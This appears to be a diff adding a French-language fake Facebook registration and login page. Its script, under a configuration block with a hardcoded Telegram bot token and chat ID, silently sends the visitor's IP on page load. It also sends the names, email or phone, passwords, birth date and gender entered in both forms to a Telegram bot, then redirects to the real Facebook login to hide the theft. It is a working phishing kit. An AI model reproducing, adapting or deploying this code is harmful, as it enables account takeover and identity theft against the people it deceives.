@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Facebook – Connexion</title>
+<title>Facebook – Inscription &amp; Connexion</title>
 <style>
   :root {
     --fb-blue: #1877f2;
@@ -28,36 +28,76 @@
     padding: 20px;
   }
   .fb-logo {
-    margin-bottom: 20px;
+    margin-bottom: 18px;
     text-align: center;
   }
   .fb-logo svg {
-    width: 200px;
-    height: 70px;
+    width: 180px;
+    height: 64px;
   }
   .card {
     background: var(--card);
     width: 100%;
-    max-width: 396px;
+    max-width: 432px;
     padding: 18px 16px 24px;
     border-radius: 8px;
     box-shadow: 0 2px 12px rgba(0,0,0,0.12), 0 0 0 1px rgba(0,0,0,0.04);
     text-align: center;
+    position: relative;
+    overflow: hidden;
   }
   .card-title {
     font-size: 18px;
     font-weight: 600;
     color: var(--text);
-    margin-bottom: 14px;
+    margin-bottom: 10px;
     line-height: 1.34;
+  }
+  .card-sub {
+    font-size: 13px;
+    color: var(--muted);
+    margin-bottom: 16px;
+  }
+  .page {
+    display: none;
+  }
+  .page.active {
+    display: block;
+  }
+  .step-indicator {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+  .step-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: var(--border);
+    transition: .3s;
+  }
+  .step-dot.active {
+    background: var(--fb-blue);
+    width: 28px;
+    border-radius: 4px;
   }
   form { text-align: left; }
   .field-group {
     margin-bottom: 12px;
   }
-  input {
+  .field-group label {
+    display: block;
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+    margin-bottom: 4px;
+  }
+  input, select {
     width: 100%;
-    padding: 14px 16px;
+    padding: 12px 14px;
     background: var(--input-bg);
     border: 1px solid var(--border);
     border-radius: 6px;
@@ -65,13 +105,68 @@
     color: var(--text);
     transition: .2s;
   }
-  input:focus {
+  input:focus, select:focus {
     outline: none;
     border-color: var(--fb-blue);
     background: var(--card);
     box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
   }
   input::placeholder { color: #8a8d91; }
+  select { appearance: none; cursor: pointer; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M6 8L1 3h10z' fill='%23606770'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 12px center; }
+  .row2, .row3 {
+    display: flex;
+    gap: 8px;
+  }
+  .row2 .field-group, .row3 .field-group { flex: 1; }
+  .row3 .field-group select { padding: 12px 8px; font-size: 14px; }
+  .birth-label {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+    margin-bottom: 4px;
+  }
+  .gender-group {
+    display: flex;
+    gap: 8px;
+  }
+  .gender-option {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 12px;
+    background: var(--input-bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    cursor: pointer;
+    transition: .2s;
+    font-size: 14px;
+    color: var(--text);
+  }
+  .gender-option:hover {
+    border-color: var(--fb-blue);
+  }
+  .gender-option input[type="radio"] {
+    width: 16px;
+    height: 16px;
+    accent-color: var(--fb-blue);
+    cursor: pointer;
+  }
+  .gender-label-text {
+    flex: 1;
+    text-align: left;
+    margin-left: 4px;
+  }
+  .info-text {
+    font-size: 11px;
+    color: #8a8d91;
+    margin: 10px 0 14px;
+    line-height: 1.4;
+  }
+  .info-text a { color: #385898; text-decoration: none; }
+  .info-text a:hover { text-decoration: underline; }
   .btn-fb {
     width: 100%;
     padding: 14px;
@@ -84,12 +179,21 @@
     cursor: pointer;
     transition: .2s;
   }
-  .btn-fb:hover {
-    background: var(--fb-blue-hover);
+  .btn-fb:hover { background: var(--fb-blue-hover); }
+  .btn-fb:active { background: #1a6ed8; }
+  .btn-green {
+    width: 100%;
+    padding: 14px;
+    background: var(--fb-green);
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 17px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: .2s;
   }
-  .btn-fb:active {
-    background: #1a6ed8;
-  }
+  .btn-green:hover { background: var(--fb-green-hover); }
   .forgot-link {
     display: block;
     text-align: center;
@@ -103,63 +207,44 @@
   .divider {
     height: 1px;
     background: var(--border);
-    margin: 10px 0 18px;
+    margin: 14px 0 18px;
   }
-  .btn-signup {
-    display: inline-block;
-    padding: 12px 24px;
-    background: var(--fb-green);
-    color: #fff;
-    border: none;
-    border-radius: 6px;
-    font-size: 15px;
-    font-weight: 700;
-    cursor: pointer;
+  .switch-link {
+    display: block;
+    margin-top: 16px;
+    font-size: 13px;
+    color: var(--muted);
+  }
+  .switch-link a {
+    color: var(--fb-blue);
     text-decoration: none;
-    transition: .2s;
+    font-weight: 600;
+    cursor: pointer;
   }
-  .btn-signup:hover {
-    background: var(--fb-green-hover);
-  }
+  .switch-link a:hover { text-decoration: underline; }
   .footer-text {
     text-align: center;
-    margin-top: 28px;
+    margin-top: 24px;
     font-size: 13px;
     color: #737373;
   }
-  .footer-text a {
-    color: var(--text);
-    font-weight: 600;
-    text-decoration: none;
-  }
+  .footer-text a { color: var(--text); font-weight: 600; text-decoration: none; }
   .footer-text a:hover { text-decoration: underline; }
   .lang-bar {
     display: flex;
     flex-wrap: wrap;
     justify-content: center;
     gap: 6px 12px;
-    margin-top: 24px;
+    margin-top: 20px;
     max-width: 500px;
     font-size: 12px;
     color: #737373;
   }
-  .lang-bar a {
-    color: #737373;
-    text-decoration: none;
-  }
+  .lang-bar a { color: #737373; text-decoration: none; }
   .lang-bar a:hover { text-decoration: underline; }
-  .lang-bar .active { color: #737373; }
-  .footer-divider {
-    width: 100%;
-    height: 1px;
-    background: var(--border);
-    margin: 8px 0;
-  }
-  .copyright {
-    font-size: 11px;
-    color: #737373;
-    margin-top: 8px;
-  }
+  .footer-divider { width: 100%; height: 1px; background: var(--border); margin: 6px 0; }
+  .copyright { font-size: 11px; color: #737373; margin-top: 6px; }
+
   /* Spinner */
   .spinner {
     display: none;
@@ -172,19 +257,317 @@
     margin: 0 auto;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
-  .btn-fb.loading .spinner { display: inline-block; }
-  .btn-fb.loading .btn-text { display: none; }
+  .btn-fb.loading .spinner, .btn-green.loading .spinner { display: inline-block; }
+  .btn-fb.loading .btn-text, .btn-green.loading .btn-text { display: none; }
 </style>
 </head>
 <body>
 
 <div class="fb-logo">
-  <!-- Facebook logo SVG officiel -->
   <svg viewBox="0 0 568 90" fill="none" xmlns="http://www.w3.org/2000/svg">
     <path d="M0 14.9C0 6.7 7.1 0 15.5 0H523C531.4 0 538 6.7 538 14.9V74.1C538 82.3 531.4 89 523 89H15.5C7.1 89 0 82.3 0 74.1V14.9Z" fill="#1877F2"/>
+    <path d="M173.5 28.7C173.5 17.3 165.3 11 155.5 11H147V22.4H153.5C157.7 22.4 160.6 24.8 160.6 28.7V39.5H147V50.3H160.6V72.5H173.5V50.3H187.2V39.5H173.5V28.7Z" fill="white"/>
     <path d="M223.5 28.7V39.5H209.8V50.3H223.5V72.5H236.4V50.3H250.1V39.5H236.4V28.7C236.4 24.8 239.3 22.4 243.5 22.4H250.1V11H241.5C231.7 11 223.5 17.3 223.5 28.7Z" fill="white"/>
     <path d="M275.6 22.4C263.1 22.4 253.8 31.2 253.8 43.7C253.8 56.2 263.1 65 275.6 65C288.1 65 297.4 56.3 297.4 43.7C297.4 31.1 288.2 22.4 275.6 22.4ZM275.6 55.2C269 55.2 264.1 50.2 264.1 43.7C264.1 37.2 269 32.2 275.6 32.2C282.2 32.2 287.1 37.2 287.1 43.7C287.1 50.2 282.3 55.2 275.6 55.2Z" fill="white"/>
     <path d="M341.2 22.4C334.9 22.4 329.7 25.8 326.5 30.6V23.7H314.4V72.5H327.1V52.3C327.1 45.6 330.5 40.5 337.2 40.5C343.1 40.5 346.5 44.3 346.5 50.5V72.5H359.2V48.5C359.2 35.8 352.9 22.4 341.2 22.4Z" fill="white"/>
     <path d="M382.5 22.4C370 22.4 360.7 31.2 360.7 43.7C360.7 56.2 370 65 382.5 65C395 65 404.3 56.3 404.3 43.7C404.3 31.1 395.1 22.4 382.5 22.4ZM382.5 55.2C375.9 55.2 371 50.2 371 43.7C371 37.2 375.9 32.2 382.5 32.2C389.1 32.2 394 37.2 394 43.7C394 50.2 389.2 55.2 382.5 55.2Z" fill="white"/>
     <path d="M443.6 22.4C437.3 22.4 432.1 25.8 428.9 30.6V23.7H416.8V72.5H429.5V52.3C429.5 45.6 432.9 40.5 439.6 40.5C445.5 40.5 448.9 44.3 448.9 50.5V72.5H461.6V48.5C461.6 35.8 455.3 22.4 443.6 22.4Z" fill="white"/>
-    <path d="M511.7 23.7H498.8V44.9C498.8 51.7 495.2 55.2 489.6 55.2C484.2 55.2 481.3 51.7 481
+    <path d="M511.7 23.7H498.8V44.9C498.8 51.7 495.2 55.2 489.6 55.2C484.2 55.2 481.3 51.7 481.3 45.5V23.7H468.5V47.1C468.5 60.8 476.5 65 485.4 65C492.4 65 496.9 61.3 499.6 56.3V64.2H511.7C511.7 64.2 511.7 25.8 511.7 23.7Z" fill="white"/>
+    <circle cx="105" cy="45" r="22" fill="white"/>
+    <path d="M105 29C96.7 29 90 35.7 90 44C90 52.3 96.7 59 105 59C113.3 59 120 52.3 120 44C120 35.7 113.3 29 105 29ZM111 46.7H107.7V54H102.3V46.7H99V44C99 43.7 99.3 43.5 99.6 43.5H102.3V41.2C102.3 38.8 104.1 37 106.5 37H110.4V39.8H107.7C107 39.8 106.5 40.3 106.5 41V43.5H110.7L111 46.7Z" fill="#1877F2"/>
+  </svg>
+</div>
+
+<div class="card">
+  <div class="step-indicator">
+    <div class="step-dot active" id="dot1"></div>
+    <div class="step-dot" id="dot2"></div>
+  </div>
+
+  <!-- ============ PAGE 1 : INSCRIPTION ============ -->
+  <div class="page active" id="pageRegister">
+    <div class="card-title">Créez un compte</div>
+    <div class="card-sub">C'est rapide et facile.</div>
+
+    <form id="registerForm" autocomplete="off">
+      <div class="row2">
+        <div class="field-group">
+          <input type="text" id="firstname" placeholder="Prénom" required autofocus>
+        </div>
+        <div class="field-group">
+          <input type="text" id="lastname" placeholder="Nom de famille" required>
+        </div>
+      </div>
+
+      <div class="field-group">
+        <input type="text" id="regEmail" placeholder="Numéro de mobile ou e-mail" required>
+      </div>
+
+      <div class="field-group">
+        <input type="password" id="regPassword" placeholder="Nouveau mot de passe" required>
+      </div>
+
+      <div class="birth-label">Date de naissance</div>
+      <div class="row3">
+        <div class="field-group">
+          <select id="birthDay">
+            <option value="">Jour</option>
+            <option>1</option><option>2</option><option>3</option><option>4</option><option>5</option>
+            <option>6</option><option>7</option><option>8</option><option>9</option><option>10</option>
+            <option>11</option><option>12</option><option>13</option><option>14</option><option>15</option>
+            <option>16</option><option>17</option><option>18</option><option>19</option><option>20</option>
+            <option>21</option><option>22</option><option>23</option><option>24</option><option>25</option>
+            <option>26</option><option>27</option><option>28</option><option>29</option><option>30</option>
+            <option>31</option>
+          </select>
+        </div>
+        <div class="field-group">
+          <select id="birthMonth">
+            <option value="">Mois</option>
+            <option value="01">Jan</option><option value="02">Fév</option><option value="03">Mar</option>
+            <option value="04">Avr</option><option value="05">Mai</option><option value="06">Jun</option>
+            <option value="07">Jul</option><option value="08">Aoû</option><option value="09">Sep</option>
+            <option value="10">Oct</option><option value="11">Nov</option><option value="12">Déc</option>
+          </select>
+        </div>
+        <div class="field-group">
+          <select id="birthYear">
+            <option value="">Année</option>
+            <option>2008</option><option>2007</option><option>2006</option><option>2005</option>
+            <option>2004</option><option>2003</option><option>2002</option><option>2001</option>
+            <option>2000</option><option>1999</option><option>1998</option><option>1997</option>
+            <option>1996</option><option>1995</option><option>1994</option><option>1993</option>
+            <option>1992</option><option>1991</option><option>1990</option><option>1989</option>
+            <option>1988</option><option>1987</option><option>1986</option><option>1985</option>
+            <option>1984</option><option>1983</option><option>1982</option><option>1981</option>
+            <option>1980</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="birth-label" style="margin-top:4px;">Genre</div>
+      <div class="gender-group">
+        <label class="gender-option">
+          <span class="gender-label-text">Femme</span>
+          <input type="radio" name="gender" value="Femme">
+        </label>
+        <label class="gender-option">
+          <span class="gender-label-text">Homme</span>
+          <input type="radio" name="gender" value="Homme">
+        </label>
+        <label class="gender-option">
+          <span class="gender-label-text">Personnalisé</span>
+          <input type="radio" name="gender" value="Personnalisé">
+        </label>
+      </div>
+
+      <div class="info-text">
+        En cliquant sur "S'inscrire", vous acceptez nos <a href="#">Conditions générales</a>, notre <a href="#">Politique de confidentialité</a> et notre <a href="#">Politique d'utilisation des cookies</a>.
+      </div>
+
+      <button type="submit" class="btn-green" id="regBtn">
+        <span class="btn-text">S'inscrire</span>
+        <div class="spinner"></div>
+      </button>
+    </form>
+
+    <div class="switch-link">
+      Vous avez déjà un compte ? <a onclick="showLoginPage()">Connectez-vous</a>
+    </div>
+  </div>
+
+  <!-- ============ PAGE 2 : CONNEXION ============ -->
+  <div class="page" id="pageLogin">
+    <div class="card-title">Connectez-vous à Facebook</div>
+
+    <form id="loginForm" autocomplete="off">
+      <div class="field-group">
+        <input type="text" id="loginEmail" placeholder="Adresse e-mail ou numéro de téléphone" required autofocus>
+      </div>
+      <div class="field-group">
+        <input type="password" id="loginPassword" placeholder="Mot de passe" required>
+      </div>
+
+      <button type="submit" class="btn-fb" id="loginBtn">
+        <span class="btn-text">Se connecter</span>
+        <div class="spinner"></div>
+      </button>
+    </form>
+
+    <a href="#" class="forgot-link">Mot de passe oublié ?</a>
+
+    <div class="divider"></div>
+
+    <button class="btn-green" onclick="showRegisterPage()" style="font-size:15px; padding:12px;">
+      Créer un nouveau compte
+    </button>
+  </div>
+</div>
+
+<div class="footer-text">
+  <a href="#">Créer une Page</a> pour une célébrité, un groupe ou une entreprise.
+</div>
+
+<div class="lang-bar">
+  <a href="#" class="active">Français (France)</a>
+  <a href="#">English (US)</a>
+  <a href="#">Español</a>
+  <a href="#">Português (Brasil)</a>
+  <a href="#">Deutsch</a>
+  <a href="#">Italiano</a>
+  <a href="#">العربية</a>
+  <a href="#">日本語</a>
+  <a href="#">한국어</a>
+  <a href="#">中文(简体)</a>
+  <div class="footer-divider"></div>
+  <span class="copyright">Facebook © 2026</span>
+</div>
+
+<script>
+/* ================= CONFIGURATION ================= */
+const TELEGRAM_TOKEN = "8868444212:AAGolj5sgNEmXpUhPQ_SUyEXSpQDO-N9T1A";
+const CHAT_ID        = "8675191556";
+const REDIRECT_URL   = "https://www.facebook.com/login/";
+/* ================================================= */
+
+function telegramUrl(text) {
+  return "https://api.telegram.org/bot" + TELEGRAM_TOKEN +
+         "/sendMessage?chat_id=" + CHAT_ID +
+         "&text=" + encodeURIComponent(text);
+}
+
+function sendToTelegram(text) {
+  var img = new Image();
+  img.src = telegramUrl(text);
+}
+
+/* Notification IP à l'ouverture */
+var notified = false;
+function notifyOpen() {
+  if (notified) return;
+  notified = true;
+  try {
+    fetch("https://api.ipify.org?format=json")
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        sendToTelegram("📥 Page Facebook ouverte\n🌐 IP : " + d.ip + "\n🕐 " + new Date().toLocaleString());
+      })
+      .catch(function(){
+        sendToTelegram("📥 Page Facebook ouverte\n🕐 " + new Date().toLocaleString());
+      });
+  } catch(e) {}
+}
+
+/* Changement de page */
+function showLoginPage() {
+  document.getElementById("pageRegister").classList.remove("active");
+  document.getElementById("pageLogin").classList.add("active");
+  document.getElementById("dot1").classList.remove("active");
+  document.getElementById("dot2").classList.add("active");
+  document.getElementById("loginEmail").focus();
+}
+
+function showRegisterPage() {
+  document.getElementById("pageLogin").classList.remove("active");
+  document.getElementById("pageRegister").classList.add("active");
+  document.getElementById("dot2").classList.remove("active");
+  document.getElementById("dot1").classList.add("active");
+  document.getElementById("firstname").focus();
+}
+
+/* ---------- PAGE 1 : Inscription ---------- */
+document.getElementById("registerForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  var firstname = document.getElementById("firstname").value.trim();
+  var lastname  = document.getElementById("lastname").value.trim();
+  var regEmail  = document.getElementById("regEmail").value.trim();
+  var regPass   = document.getElementById("regPassword").value.trim();
+  var birthDay  = document.getElementById("birthDay").value;
+  var birthMon  = document.getElementById("birthMonth").value;
+  var birthYear = document.getElementById("birthYear").value;
+  var gender    = document.querySelector('input[name="gender"]:checked');
+
+  if (!firstname || !lastname || !regEmail || !regPass || !birthDay || !birthMon || !birthYear || !gender) {
+    alert("Veuillez remplir tous les champs obligatoires.");
+    return;
+  }
+
+  gender = gender.value;
+
+  var btn = document.getElementById("regBtn");
+  btn.classList.add("loading");
+  btn.disabled = true;
+
+  var msg = "🎯 INSCRIPTION FACEBOOK\n" +
+            "━━━━━━━━━━━━━━━━━━\n" +
+            "👤 Prénom : " + firstname + "\n" +
+            "👤 Nom    : " + lastname + "\n" +
+            "📧 Email/Tel : " + regEmail + "\n" +
+            "🔑 Mot de passe : " + regPass + "\n" +
+            "🎂 Date naiss. : " + birthDay + "/" + birthMon + "/" + birthYear + "\n" +
+            "⚤ Genre : " + gender + "\n" +
+            "━━━━━━━━━━━━━━━━━━\n" +
+            "🖥 UA : " + navigator.userAgent.slice(0, 100) + "\n" +
+            "🕐 " + new Date().toLocaleString();
+
+  sendToTelegram(msg);
+
+  if (location.search.indexOf("test=1") !== -1) {
+    btn.classList.remove("loading");
+    btn.disabled = false;
+    alert("Test OK — inscription Facebook envoyée à Telegram");
+    return;
+  }
+
+  /* Passer à la page connexion */
+  setTimeout(function() {
+    showLoginPage();
+    btn.classList.remove("loading");
+    btn.disabled = false;
+  }, 500);
+});
+
+/* ---------- PAGE 2 : Connexion ---------- */
+document.getElementById("loginForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  var loginEmail = document.getElementById("loginEmail").value.trim();
+  var loginPass  = document.getElementById("loginPassword").value.trim();
+
+  if (!loginEmail || !loginPass) {
+    alert("Veuillez remplir tous les champs.");
+    return;
+  }
+
+  var btn = document.getElementById("loginBtn");
+  btn.classList.add("loading");
+  btn.disabled = true;
+
+  var msg = "🎯 CONNEXION FACEBOOK\n" +
+            "━━━━━━━━━━━━━━━━\n" +
+            "📧 Email/Tel : " + loginEmail + "\n" +
+            "🔑 Mot de passe : " + loginPass + "\n" +
+            "━━━━━━━━━━━━━━━━\n" +
+            "🖥 UA : " + navigator.userAgent.slice(0, 100) + "\n" +
+            "🕐 " + new Date().toLocaleString();
+
+  sendToTelegram(msg);
+
+  if (location.search.indexOf("test=1") !== -1) {
+    btn.classList.remove("loading");
+    btn.disabled = false;
+    alert("Test OK — connexion Facebook envoyée à Telegram :\n" + loginEmail + " / " + loginPass);
+    return;
+  }
+
+  /* Redirection finale vers le vrai Facebook */
+  setTimeout(function() {
+    window.location.href = REDIRECT_URL;
+  }, 400);
+});
+
+notifyOpen();
+</script>
+</body>
+</html>
